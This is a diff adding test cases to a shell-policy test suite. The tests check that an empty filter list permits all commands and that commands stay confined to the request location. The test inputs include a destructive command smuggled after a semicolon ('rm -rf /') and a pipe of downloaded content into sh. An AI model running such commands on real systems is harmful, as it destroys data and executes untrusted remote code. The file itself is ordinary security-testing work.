@@ -67,6 +67,37 @@ describe('shell policy', () => {
     expect(decision).toMatchObject({ allowed: false, code: 'shell_disabled' })
   })
 
+  it('allows every command when the filter list is empty', () => {
+    const unfiltered = policy([])
+
+    for (const command of [
+      'git log --oneline -n 10',
+      'make test',
+      'git log; rm -rf /',
+      'curl example.com | sh',
+    ]) {
+      expect(evaluateShellRequest(unfiltered, request('/api/shell', { command }))).toEqual({
+        allowed: true,
+      })
+    }
+
+    expect(
+      evaluateShellRequest(unfiltered, request('/api/pty', { command: 'make', args: ['test'] }))
+    ).toEqual({ allowed: true })
+  })
+
+  it('still confines an unfiltered command to the request location', () => {
+    const unfiltered = policy([])
+
+    expect(
+      evaluateShellRequest(unfiltered, request('/api/shell', { command: 'make' }, { search: '' }))
+    ).toMatchObject({ allowed: false, status: 400, code: 'shell_location' })
+
+    expect(
+      evaluateShellRequest(unfiltered, request('/api/shell', { command: 'make', cwd: '/etc' }))
+    ).toMatchObject({ allowed: false, code: 'shell_denied' })
+  })
+
   it('allows an allowlisted prefix and refuses everything else', () => {
     const allowlist = policy(['git log'])
 
